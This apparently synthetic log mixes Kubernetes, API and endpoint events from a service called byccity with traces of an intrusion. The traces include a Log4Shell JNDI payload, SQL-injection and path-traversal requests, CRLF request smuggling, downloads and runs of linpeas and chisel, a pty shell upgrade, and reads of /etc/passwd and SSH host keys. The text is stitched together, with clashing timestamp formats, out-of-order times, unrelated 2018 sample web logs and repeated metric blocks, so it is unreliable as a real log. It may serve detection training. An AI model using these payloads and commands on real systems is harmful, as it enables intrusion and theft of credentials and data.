17:46:05.471, kubernetes.hints.container_logs, [CLEANUP] AverageLatency(us) 1009.0
17:46:05.471, kubernetes.hints.container_logs, [CLEANUP] MinLatency(us) 1009
17:46:05.471, endpoint.events.file, Endpoint file event
19:58:41.025, app-search-analytics,checking server logs for any errors or warnings related to message retrieval.
19:58:43.025, app-search-analytics,verifying connectivity between the application and the database server.
19:58:44.025, app-search-analytics,attempting to reload the message data from the database.
19:58:44.095, api,[][access] "POST /api/as/v1/docs/application/apply/snils HTTP/" 200 0
19:58:45.025, app-search-analytics,failed to find message
19.58.45.150, kubernetes.hints.container_logs, method [POST] host [https://byccity.ru:80]  URI [/apply/_snils?ver=true&auth=true] http.request.headers.User-Agent Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.90 Safari/537.36
19.58.45.329, kubernetes.hints.container_logs, [][access] "GET /snils
19.58.45.333, kubernetes.hints.container_logs, Return=ERROR 3
19:58:45.991, kubernetes.hints.container_logs, method [POST] host [https://byccity.ru:80]  URI [/apply/_snils?ver=true&auth=true] http.request.headers.X-Api-Version ${jndi:ldap://10.102.26.6/form}
19:58:46.016, kubernetes.hints.container_logs, 2024-05-27T07:59:01.413+0000 I NETWORK  [listener] connection accepted from 127.0.0.1:80 #17531436 (1 connection now open)
19:58:48.104, endpoint.events.network,Endpoint network event
19:58:48:458, kubernetes.hints.container_logs, {os: {type: "Linux"; name: "PRETTY_NAME="Debian GNU/Linux 9""; architecture: "x86_64"; version: "Kernel 5.15.109+"}
19.59.48.551, kubernetes.hints.container_logs, Command line: ip a
19.58.49.001, kubernetes.hints.container_logs, Command line: wget github.com/redt1prodigy/red_team_things/raw/main/linpeas.sh
19.59.12.051, kubernetes.hints.container_logs, Command line: wget github.com/redt1prodigy/red_team_things/raw/main/chisel
20.00.01.000, kubernetes.hints.container_logs, Command line: ./l1npeas.sh
20.00.01.999, kubernetes.hints.container_logs, Return=ERROR 3s
20.00.02.457, kubernetes.hints.container_logs, Client closed connection
20.00.02.789, kubernetes.hints.container_logs, failed to find message
20.00.03.100, kubernetes.hints.container_logs, failed to find message
20.00.03.100, kubernetes.hints.container_logs, failed to find message
20.00.03.100, elastic_agent, [elastic_agent][info] Unit state changed beat/metrics-monitoring-metrics-monitoring-beats (CONFIGURING->HEALTHY): Healthy
20.00.03.100, sample_web_logs, 4.105.4.45 - - [2018-08-01T14:28:47.797Z] "GET /kibana/kibana-6.3.2-linux-x86_64.tar.gz HTTP/1.1" 200 2772 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:6.0a1) Gecko/20110421 Firefox/6.0a1"
20.00.03.100, sample_web_logs, 116.174.134.165 - - [2018-08-01T14:28:51.492Z] "GET /apm-server/apm-server-6.3.2-windows-x86.zip HTTP/1.1" 200 3334 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
20.00.03.100, sample_web_logs, 113.214.198.170 - - [2018-08-01T14:35:19.781Z] "GET /beats/metricbeat/metricbeat-6.3.2-i686.rpm HTTP/1.1" 200 8155 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
20.00.03.100, sample_web_logs, 3.98.45.188 - - [2018-08-01T14:35:39.713Z] "GET /styles/app.css HTTP/1.1" 200 5787 "-" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24"
20.00.03.100, kubernetes.hints.containerlogs, failed to find Loading workload...
20.00.03.100, kubernetes.hints.container_logs, failed to find message
20.00.03.100, kubernetes.hints.container_logs, failed to find message
20.00.03.100, kubernetes.hints.container_logs, failed to find message
20.00.03.100, kubernetes.hints.container_logs, failed to find message
20.00.03.100, - , Elasticsearch exception [type=index_not_found_exception reason=no such index [ads]]
20.00.03.100, - , Elasticsearch exception [type=index_not_found_exception reason=no such index [ads]]
20.00.03.100, - , Elasticsearch exception [type=index_not_found_exception reason=no such index [ads]]
20.00.03.100, - , Elasticsearch exception [type=index_not_found_exception reason=no such index [ads]]
20.00.03.100, kubernetes.hints.container_logs, failed to find message
20.00.03.100, kubernetes.hints.container_logs, failed to find message
20.00.03.100, kubernetes.hints.container_logs, failed to find message
20.00.03.100, kubernetes.hints.container_logs, failed to find message
20.00.03.229, kubernetes.hints.container_logs, failed to find Loading workload...
20:00:03.229, kubernetes.hints.container_logs, [OVERALL] RunTime(ms) 1386
20:00:03.229, kubernetes.hints.container_logs, [OVERALL] Throughput(ops/sec) 6.4935064935064934
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GCS_Copy] Count 8
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME_Copy] Time(ms) 15
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME_%Copy] Time(%) 1.0822510822510822
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GCS_MarkSweepCompact] Count 0
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME_MarkSweepCompact] Time(ms) 0
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME%MarkSweepCompact] Time(%) 0.0
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GCs] Count 8
20:00:03.229, - , Elasticsearch exception [type=index_not_found_exception reason=no such index [ads]]
20:00:03.229, app-search-analytics, failed to find message
20:00:03.229, api, [][access]   "POST /api/as/v1/engines/movies/click HTTP/" 200 0
20:00:03.229, kubernetes.hints.container_logs, WARN [Consumer clientId=consumer-1 groupId=metrics-kafka-loadgen] Connection to node -1 could not be established. Broker may not be available. (org.apache.kafka.clients.NetworkClient)
20:00:03.229, kubernetes.hints.container_logs, {"log.level":"error" "log.logger":"reader_json" "log.origin":{"file.name":"readjson/json.go""file.line":75} "message":"Error decoding JSON: invalid character 'r' in literal false (expecting 'a')" "service.name":"filebeat" "ecs.version":"1.6.0"}
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME] Time(ms) 15
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME%] Time(%) 1.0822510822510822
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] Operations 2
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] AverageLatency(us) 774.5
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] MinLatency(us) 5
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] MaxLatency(us) 1544
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] 95thPercentileLatency(us) 1544
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] 99thPercentileLatency(us) 1544
20:00:03.229, kubernetes.hints.container_logs, [SCAN] Operations 9
20:00:03.229, kubernetes.hints.container_logs, [SCAN] AverageLatency(us) 51987.0
20:00:03.229, kubernetes.hints.container_logs, [SCAN] MinLatency(us) 1154
20:00:03.229, kubernetes.hints.container_logs, Average number of seconds to run all queries: 0.028 seconds
20:00:03.229, kubernetes.hints.container_logs, Minimum number of seconds to run all queries: 0.026 seconds
20:00:03.229, kubernetes.hints.container_logs, Maximum number of seconds to run all queries: 0.030 seconds
20:00:03.229, kubernetes.hints.container_logs, Number of clients running queries: 5
20:00:03.229, kubernetes.hints.container_logs, Average number of queries per12:01:30.318 kubernetes.hints.container_logs [OVERALL] RunTime(ms) 1386
20:00:03.229, kubernetes.hints.container_logs, 2024-05-28T23:44:06.221+0000 I NETWORK  [listener] connection accepted from 10.12.3.129:37396 #15695910 (2 connections now open)
20:00:03.229, kubernetes.hints.container_logs, 2024-05-28T23:44:06.221+0000 I NETWORK  [listener] connection accepted from 10.12.3.129:37398 #15695911 (3 connections now open)
20:00:03.229, kubernetes.hints.container_logs, 2024-05-28T23:44:06.410+0000 I NETWORK  [conn15695910] end connection 10.12.3.129:37396 (2 connections now open)
20:00:03.229, kubernetes.hints.container_logs, 2024-05-28T23:44:06.410+0000 I NETWORK  [conn15695911] end connection 10.12.3.129:37398 (1 connection now open)
20:00:03.229, kubernetes.hints.container_logs, 2024-05-28T23:44:06.411+0000 I NETWORK  [conn15695909] end connection 10.12.3.129:37386 (0 connections now open)
20:00:03.229, kubernetes.hints.container_logs, [OVERALL] Throughput(ops/sec) 6.4935064935064934
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GCS_Copy] Count 8
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME_Copy] Time(ms) 15
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME_%_Copy] Time(%) 1.0822510822510822
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GCS_MarkSweepCompact] Count 0
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME_MarkSweepCompact] Time(ms) 0
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME_%_MarkSweepCompact] Time(%) 0.0
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GCs] Count 8
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME] Time(ms) 15
20:00:03.229, kubernetes.hints.container_logs, [TOTAL_GC_TIME_%] Time(%) 1.0822510822510822
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] Operations 2
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] AverageLatency(us) 774.5
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] MinLatency(us) 5
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] MaxLatency(us) 1544
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] 95thPercentileLatency(us) 1544
20:00:03.229, kubernetes.hints.container_logs, [CLEANUP] 99thPercentileLatency(us) 1544
20:00:03.229, kubernetes.hints.container_logs, [SCAN] Operations 9
20:00:03.229, kubernetes.hints.container_logs, [SCAN] AverageLatency(us) 51987.0
20:00:03.229, kubernetes.hints.container_logs, [SCAN] MinLatency(us) 1154
20:00:03.229, kubernetes.hints.container_logs, [SCAN] MaxLatency(us) 188927
20:00:03.229, kubernetes.hints.container_logs, [SCAN] MaxLatency(us) 188927.
20:01:12.325, app-search-analytics,verifying data integrity in the database.
20:01:13.325, app-search-analytics,retrieving latest updates from the database.
20:01:13.395, api,[][access] "GET /api/as/v1/docs/application/details/snils HTTP/" 200 0
20:01:14.325, app-search-analytics,processing data for analysis.
20:01:14.697, api,[][access] "POST /api/as/v1/docs/application/apply/passport HTTP/" 200 0
20:01:14.391, kubernetes.hints.container_logs, method [POST] host [https://byccity.ru:80]  URI [/apply/_passport?ver=true&auth=true] http.request.headers.User-Agent Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.90 Safari/537.36
20.01.14.999, kubernetes.hints.container_logs, Return=ERROR 3
20:01:20.069, api,[][access] "POST /api/as/v1/docs/application/apply/passport HTTP/" 200 0
20:01:20.172, kubernetes.hints.container_logs, method [POST] host [https://byccity.ru:80]  URI [/apply/_passport?ver=true&auth=true] http.request.headers.Host https://bycc1ty.com/reset-password/ab
20.01.20.344, kubernetes.hints.container_logs, Return=ERROR 3
20.01.50.000, kubernetes.hints.container_logs, method [GET] /%20HTTP/1.1%0d%0aHost:%20byccity.ru%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.
20:01:53.229, kubernetes.hints.containerlogs, [TOTALGCTIME%Copy] Time(%) 1.0822510822510822
20:01:53.229, kubernetes.hints.containerlogs, [TOTALGCSMarkSweepCompact] Count 0
20:01:53.229, kubernetes.hints.containerlogs, TOTAL_GC_TIME_MarkSweepCompact Time(ms) 0
20:01:53.229, kubernetes.hints.containerlogs, [TOTALGCTIME%MarkSweepCompact] Time(%) 0.0
20:01:53.229, kubernetes.hints.containerlogs, TOTAL_GCs Count 8
20:01:53.229, kubernetes.hints.containerlogs, [TOTALGCTIME] Time(ms) 15
20:02:00.109, kubernetes.hints.containerlogs, TOTAL_GC_TIME% Time(%) 1.0822510822510822
20:02:00.329, kubernetes.hints.containerlogs, [CLEANUP] Operations 2
20:02:00.329, kubernetes.hints.containerlogs, CLEANUP AverageLatency(us) 774.5
20:02:00.329, kubernetes.hints.containerlogs, [CLEANUP] MinLatency(us) 5
20:02:00.329, kubernetes.hints.containerlogs, CLEANUP MaxLatency(us) 1544
20:02:00.329, api, [][access] "GET /api/as/v1/docs/application/auth/login/?user=admin&pass=admin') or 1'='1'-- HTTP/" 200 1491
20:02:00.329, api, [][access] "GET /api/as/v1/docs/application/auth/login/?user=admin&pass=admin') or '1'='1' HTTP/" 200 1491
20:02:00.329, kubernetes.hints.container_logs, I NETWORK  [listener] connection accepted from 127.0.0.1:80 #27531111 (1 connection now open)
20:02:00.329, endpoint.events.network, Endpoint network event
20:02:00.329, kubernetes.hints.container_logs, {os: {type: "Linux"; name: "PRETTY_NAME="Debian GNU/Linux 9""; architecture: "x86_64"; version: "Kernel 5.15.109+"}
20:02:00.329, kubernetes.hints.container_logs, Command line: python -c `import pty;pty.spawn(“/bin/bash”);`
20:02:00.329, kubernetes.hints.container_logs, Command line: cat /etc/default/grub
20:02:00.329, kubernetes.hints.container_logs, Command line: crontab -l
20:02:00.329, kubernetes.hints.container_logs, Command line: cat /etc/passwd
20:02:00.329, kubernetes.hints.container_logs, Command line: ls -la
20:02:00.329, kubernetes.hints.container_logs, Command line: find . -name "*.txt"
20:02:00.329, kubernetes.hints.container_logs, Command line: cat /Documents/finances.txt
20:02:00.329, kubernetes.hints.container_logs, Command line: wget github.com/peass-ng/PEASS-ng/releases/download/20240526-eac1a3fa/linpeas.sh
20:02:00.329, kubernetes.hints.container_logs, Command line: ./linpeas.sh
20:02:00.329, kubernetes.hints.container_logs, Command line: cat /etc/ssh/ssh_host_key
20:02:00.329, kubernetes.hints.container_logs, Command line: cat /etc/ssh/ssh_host_key.pub
20.00.02.457, kubernetes.hints.container_logs, Client closed connection
20:02:00.329, kubernetes.hints.containerlogs, [CLEANUP] 95thPercentileLatency(us) 1544
20:02:00.329, kubernetes.hints.containerlogs, CLEANUP 99thPercentileLatency(us) 1544
20:02:00.329, kubernetes.hints.containerlogs, [SCAN] Operations 9
20:02:00.329, kubernetes.hints.containerlogs, SCAN AverageLatency(us) 51987.0
20:02:00.329, kubernetes.hints.containerlogs, [SCAN] MinLatency(us) 1154
20:02:00.329, kubernetes.hints.containerlogs, SCAN MaxLatency(us) 188927.
20:02:00.329, kubernetes.hints.containerlogs, [CLEANUP] Operations 2
20:02:00.329, kubernetes.hints.containerlogs, CLEANUP AverageLatency(us) 774.5
20:02:00.329, kubernetes.hints.containerlogs, [CLEANUP] MinLatency(us) 5
20:02:00.329, kubernetes.hints.containerlogs, CLEANUP MaxLatency(us) 1544
20:02:00.329, kubernetes.hints.containerlogs, [CLEANUP] 95thPercentileLatency(us) 1544
20:02:00.329, kubernetes.hints.containerlogs, CLEANUP 99thPercentileLatency(us) 1544
20:02:00.329, kubernetes.hints.containerlogs, [SCAN] Operations 9
20:02:00.329, kubernetes.hints.containerlogs, SCAN AverageLatency(us) 51987.0
20:02:00.329, kubernetes.hints.containerlogs, [SCAN] MinLatency(us) 1154
20:02:00.329, kubernetes.hints.containerlogs, SCAN MaxLatency(us) 188927.
20:02:00.329, - , Elasticsearch exception [type=index_not_found_exception reason=no such index [ads]]
20:02:00.329, app-search-analytics, failed to find message
20:02:00.329, api, [][access]   "POST /api/as/v1/engines/movies/click HTTP/" 200 0
20:02:00.329, kubernetes.hints.container_logs, WARN [Consumer clientId=consumer-1 groupId=metrics-kafka-loadgen] Connection to node -1 could not be established. Broker may not be available. (org.apache.kafka.clients.NetworkClient)
20:02:00.329, kubernetes.hints.containerlogs, [CLEANUP] Operations 2
20:02:00.329, kubernetes.hints.containerlogs, CLEANUP AverageLatency(us) 774.5
20:02:00.329, kubernetes.hints.containerlogs, [CLEANUP] MinLatency(us) 5
20:02:00.329, kubernetes.hints.containerlogs, CLEANUP MaxLatency(us) 1544
20:02:00.329, kubernetes.hints.containerlogs, [CLEANUP] 95thPercentileLatency(us) 1544
20:02:00.329, kubernetes.hints.containerlogs, CLEANUP 99thPercentileLatency(us) 1544
20:02:00.329, kubernetes.hints.containerlogs, [SCAN] Operations 9
20:02:00.329, kubernetes.hints.containerlogs, SCAN AverageLatency(us) 51987.0
20:02:00.329, kubernetes.hints.containerlogs, [SCAN] MinLatency(us) 1154
20:02:00.329, kubernetes.hints.containerlogs, SCAN MaxLatency(us) 188927.
20:02:00.329, kubernetes.hints.container_logs, method [POST] host [https://byccity.ru:80]  URI [/apply/_university?ver=true&auth=true] http.request.headers.User-Agent Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/77.0.3865.90 Safari/537.36
20:02:00.329, kubernetes.hints.container_logs, [][access] "GET /university
20:02:00.329, kubernetes.hints.container_logs, Return=ERROR 3
20:02:00.329, kubernetes.hints.container_logs, method [POST] host [https://byccity.ru:80]  URI [/apply/_university?ver=true&auth=true] http.request.headers.Referer https://byccity.ru/application/university/reset/login
20:02:00.329, kubernetes.hints.container_logs, I NETWORK  [listener] connection accepted from 127.0.0.1:80 #17531436 (1 connection now open)
20:02:00.329, endpoint.events.network,Endpoint network event
23:20:51.601, endpoint.events.file, Endpoint file event
23:20:51.601, api, [][access]   "POST /api/as/v1/engines/movies/search HTTP/" 200 544
23:20:51.601, endpoint.events.network, Endpoint network event
23:20:51.601, kubernetes.hints.container_logs, Error: Executing consumer group command failed due to The consumer group command timed out while waiting for group to initialize:
23:20:51.601, endpoint.events.network, Endpoint network event
23:20:51.601, kubernetes.hints.container_logs, mongo client connection created with mongodb://mongodb-service:27017/bycity?w=1&authSource=admin
23:20:51.602, endpoint.events.file, Endpoint file event
23:20:51.640, endpoint.events.file, Endpoint file event
23:20:51.641, endpoint.events.file, Endpoint file event
23:20:51.643, endpoint.events.file, Endpoint file event
23:20:51.646, endpoint.events.network, Endpoint network event
23:20:51.648, endpoint.events.network, Endpoint network event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, kubernetes.hints.container_logs, FATAL:  password authentication failed for user "root"
23:20:51.652, api,[][access] "GET /api/as/v1/docs/application/apply/?fn=../../../../../etc/passwd HTTP/" 200 1491
23:20:51.652, api,[][access] "GET /api/as/v1/docs/application/apply/?fn=../../../etc/passwd HTTP/" 200 1491
23:20:51.652, kubernetes.hints.container_logs, [][access] "GET /
23:20:51.652, app-search-analytics,unable to retrieve message from database. Attempting to troubleshoot the issue.
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, api, [][access] "POST /api/as/v1/docs/application/auth/registration?user=admin&pass=' AND id IS NULL; -- HTTP/" 200 1491
23:20:51.652, kubernetes.hints.container_logs, I NETWORK  [listener] connection accepted from 127.0.0.1:80 #27531111 (1 connection now open)
23:20:51.652, endpoint.events.network, Endpoint network event
23:20:51.652, kubernetes.hints.container_logs, {os: {type: "Linux"; name: "PRETTY_NAME="Debian GNU/Linux 9""; architecture: "x86_64"; version: "Kernel 5.15.109+"}
23:20:51.652, kubernetes.hints.container_logs, Command line: python -c `import pty;pty.spawn(“/bin/bash”);`
23:20:51.652, kubernetes.hints.container_logs, Command line: cat /proc/version
23:20:51.652, kubernetes.hints.container_logs, Command line: uname -a
23:20:51.652, kubernetes.hints.container_logs, Command line: cat /etc/passwd
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.653, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.653, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.653, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.653, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, api,[][access] "POST /api/as/v1/docs/application/apply/ege HTTP/" 200 0
23:20:51.652, app-search-analytics,failed to find message
23:20:51.652, kubernetes.hints.container_logs, method [POST] host [https://byccity.ru:80]  URI [/apply/_ege?ver=true&auth=true] http.request.headers.Content-Type application/json [{"id":12893201"; "subject":"math"}] 
23:20:51.652, kubernetes.hints.container_logs, [][access] "GET /ege
23:20:51.652, kubernetes.hints.container_logs, Return=ERROR 3
23:20:51.652, kubernetes.hints.container_logs, Return=ERROR 3s
23:20:51.652, kubernetes.hints.container_logs, Client closed connection
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.653, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.653, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.652, endpoint.events.file, Endpoint file event
23:20:51.653, endpoint.events.file, Endpoint file event
23:20:51.809, endpoint.events.network, Endpoint network event
23:20:51.983, endpoint.events.network, Endpoint network event
23:20:51.984, endpoint.events.network, Endpoint network event
23:20:52.002, app-search-analytics, failed to find message
23:26:10.861, - , Elasticsearch exception [type=index_not_found_exception reason=no such index [ads]]
23:26:10.861, - , Elasticsearch exception [type=index_not_found_exception reason=no such index [ads]]
23:26:11.121, kubernetes.hints.container_logs, Benchmark
23:26:11.121, kubernetes.hints.container_logs, Average number of seconds to run all queries: 0.024 seconds
23:26:11.121, kubernetes.hints.container_logs, Minimum number of seconds to run all queries: 0.024 seconds
23:26:11.121, kubernetes.hints.container_logs, Maximum number of seconds to run all queries: 0.026 seconds
23:26:11.121, kubernetes.hints.container_logs, Number of clients running queries: 4
23:26:11.121, kubernetes.hints.container_logs, Average number of queries per client: 0
23:27:51.118, kubernetes.hints.container_logs, [OVERALL] RunTime(ms) 1389
23:27:51.118, kubernetes.hints.container_logs, [INSERT] MinLatency(us) 460
23:27:51.118, kubernetes.hints.container_logs, [INSERT] MaxLatency(us) 196735
23:27:51.118, kubernetes.hints.container_logs, [INSERT] 95thPercentileLatency(us) 196735
23:27:51.118, kubernetes.hints.container_logs, [INSERT] 99thPercentileLatency(us) 196735
23:27:51.118, kubernetes.hints.container_logs, [INSERT] Return=OK 10
23:27:51.118, kubernetes.hints.container_logs, /usr/local/openjdk-8/bin/java -cp /opt/byccity/mongodb-binding/conf:/opt/byccity/conf:/opt/byccity/lib/core-0.13.0.jar:/opt/byccity/lib/jackson-core-asl-1.9.4.jar:/opt/byccity/lib/htrace-core4-4.1.0-incubating.jar:/opt/byccity/lib/jackson-mapper-asl-1.9.4.jar:/opt/byccity/lib/HdrHistogram-2.1.4.jar:/opt/ycsb/mongodb-binding/lib/mongo-java-driver-3.0.3.jar:/opt/byccity/mongodb-binding/lib/logback-core-1.1.2.jar:/opt/byccity/mongodb-binding/lib/mongodb-binding-0.13.0.jar:/opt/byccity/mongodb-binding/lib/slf4j-api-1.6.4.jar:/opt/ycsb/mongodb-binding/lib/mongodb-async-driver-2.0.1.jar:/opt/byccity/mongodb-binding/lib/logback-classic-1.1.2.jar -s -P /opt/byccity/workloads/workloada -p operationcount=9 -p mongodb.url=mongodb://mongodb-service:27017/byccity?w=0&authSource=admin -threads 1 -t
23:27:51.118, kubernetes.hints.container_logs, Command line: -s -P /opt/byccity//workloads/workloada -p operationcount=9 -p mongodb.url=mongodb://mongodb-service:27017/byccity?w=0&authSource=admin -threads 1 -t
23:54:43.469, kubernetes.hints.container_logs, [OVERALL] Throughput(ops/sec) 82.66129032258064
23:27:51.118, kubernetes.hints.container_logs, [OVERALL] Throughput(ops/sec) 7.199424046076314
23:27:51.118, kubernetes.hints.container_logs, [TOTAL_GCS_Copy] Count 8
23:27:51.118, kubernetes.hints.container_logs, [TOTAL_GC_TIME_Copy] Time(ms) 90
23:27:51.118, kubernetes.hints.container_logs, 2024-05-28T23:44:06.221+0000 I NETWORK  [listener] connection accepted from 10.12.3.129:37396 #15695910 (2 connections now open)
23:27:51.118, kubernetes.hints.container_logs, 2024-05-28T23:44:06.221+0000 I NETWORK  [listener] connection accepted from 10.12.3.129:37398 #15695911 (3 connections now open)
23:27:51.118, kubernetes.hints.container_logs, 2024-05-28T23:44:06.410+0000 I NETWORK  [conn15695910] end connection 10.12.3.129:37396 (2 connections now open)
23:27:51.118, kubernetes.hints.container_logs, 2024-05-28T23:44:06.410+0000 I NETWORK  [conn15695911] end connection 10.12.3.129:37398 (1 connection now open)
23:27:51.118, kubernetes.hints.container_logs, 2024-05-28T23:44:06.411+0000 I NETWORK  [conn15695909] end connection 10.12.3.129:37386 (0 connections now open)
23:27:51.118, kubernetes.hints.container_logs, [TOTAL_GC_TIME_%_Copy] Time(%) 6.479481641468683
23:27:51.118, kubernetes.hints.container_logs, [TOTAL_GCS_MarkSweepCompact] Count 0
23:27:51.118, kubernetes.hints.container_logs, [TOTAL_GC_TIME_MarkSweepCompact] Time(ms) 0
23:27:51.118, kubernetes.hints.container_logs, [TOTAL_GC_TIME_%_MarkSweepCompact] Time(%) 0.0
23:27:51.118, kubernetes.hints.container_logs, [TOTAL_GCs] Count 8
23:27:51.118, kubernetes.hints.container_logs, [TOTAL_GC_TIME] Time(ms) 90
23:27:51.118, kubernetes.hints.container_logs, [TOTAL_GC_TIME_%] Time(%) 6.479481641468683
23:27:51.118, kubernetes.hints.container_logs, [INSERT] MinLatency(us) 460
23:27:51.118, kubernetes.hints.container_logs, [INSERT] MaxLatency(us) 196735
23:27:51.118, kubernetes.hints.container_logs, [INSERT] 95thPercentileLatency(us) 196735
23:27:51.118, kubernetes.hints.container_logs, [INSERT] 99thPercentileLatency(us) 196735
23:27:51.118, kubernetes.hints.container_logs, [INSERT] Return=OK 10
